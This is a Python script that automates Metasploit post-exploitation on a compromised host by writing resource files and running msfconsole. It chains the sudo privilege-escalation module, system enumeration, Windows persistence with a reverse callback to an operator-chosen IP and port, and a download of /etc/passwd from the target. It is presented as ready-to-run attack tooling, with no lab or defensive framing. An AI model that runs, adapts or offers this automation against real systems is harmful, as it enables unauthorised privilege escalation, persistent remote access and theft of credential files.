import subprocess
import os

# Run Metasploit post-exploitation commands via resource files
def run_msf_post_exploitation(command):
    """
    Execute a Metasploit post-exploitation command using a resource file.

    Args:
        command (str): The post-exploitation command to be executed.

    Returns:
        str: The output from running the post-exploitation command.
    """
    resource_file = 'post_exploitation.rc'
    
    # Write the command to the resource file
    with open(resource_file, 'w') as f:
        f.write(command)

    try:
        # Execute the resource script using msfconsole
        result = subprocess.run(
            ['msfconsole', '-r', resource_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=600
        )
        print("Post-exploitation output:\n", result.stdout)
        if result.stderr:
            print("Errors:\n", result.stderr)

        return result.stdout

    except subprocess.TimeoutExpired:
        print("Post-exploitation module timed out.")
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None
    finally:
        # Clean up the resource file after execution
        os.remove(resource_file)

# Post-exploitation actions
def run_privilege_escalation(session_id):
    """
    Attempt privilege escalation in a given session.

    Args:
        session_id (str): The session ID in which to attempt privilege escalation.

    Returns:
        str: Output from the privilege escalation attempt.
    """
    print(f"Attempting privilege escalation in session {session_id}...")
    command = f"""
    use post/multi/escalate/sudo
    set SESSION {session_id}
    set TARGET 0
    run
    """
    return run_msf_post_exploitation(command)

def gather_system_info(session_id):
    """
    Gather system information in a given session.

    Args:
        session_id (str): The session ID from which to gather system information.

    Returns:
        str: Output from the system information gathering process.
    """
    print(f"Gathering system information for session {session_id}...")
    command = f"""
    use post/multi/gather/enum_system
    set SESSION {session_id}
    run
    """
    return run_msf_post_exploitation(command)

def establish_persistence(session_id, local_ip, local_port):
    """
    Establish persistence in a given session.

    Args:
        session_id (str): The session ID in which to establish persistence.
        local_ip (str): The local IP address for callback.
        local_port (str): The local port for the reverse connection.

    Returns:
        str: Output from the persistence setup process.
    """
    print(f"Setting up persistence in session {session_id}...")
    command = f"""
    use exploit/windows/local/persistence
    set SESSION {session_id}
    set LHOST {local_ip}
    set LPORT {local_port}
    run
    """
    return run_msf_post_exploitation(command)

def download_file(session_id, remote_path, local_path):
    """
    Download a file from the remote system to the local system.

    Args:
        session_id (str): The session ID from which to download the file.
        remote_path (str): The path of the file on the remote system.
        local_path (str): The local path where the file will be saved.

    Returns:
        str: Output from the file download process.
    """
    print(f"Downloading file from {remote_path} to {local_path} in session {session_id}...")
    command = f"""
    use post/multi/manage/download
    set SESSION {session_id}
    set REMOTE_PATH {remote_path}
    set LOCAL_PATH {local_path}
    run
    """
    return run_msf_post_exploitation(command)

# Main function to execute the post-exploitation flow
if __name__ == "__main__":
    session_id = input("Enter the session ID to perform post-exploitation: ")
    local_ip = input("Enter your local IP address: ")
    local_port = input("Enter the local port for persistence: ")

    # Example post-exploitation actions
    run_privilege_escalation(session_id)
    gather_system_info(session_id)
    establish_persistence(session_id, local_ip, local_port)
    download_file(session_id, "/etc/passwd", "downloaded_passwd.txt")
